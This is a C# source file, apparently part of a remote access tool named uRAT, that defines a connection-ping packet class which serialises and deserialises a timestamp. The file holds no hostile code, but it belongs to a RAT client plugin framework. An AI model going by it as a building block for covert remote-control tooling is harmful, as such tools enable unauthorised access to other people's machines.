using System;
using System.Diagnostics;
using System.IO;
using uNet2.Packet;

namespace uRAT.CoreClientPlugin.ConnectionPing.Packets
{
    class ConnectionPingPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 3; }
        }

        public long Timestamp { get; set; }

        public ConnectionPingPacket()
        {
        }

        public ConnectionPingPacket(long timestamp)
        {
            Timestamp = timestamp;
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(Timestamp);
        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            Timestamp = br.ReadInt64();
        }
    }
}
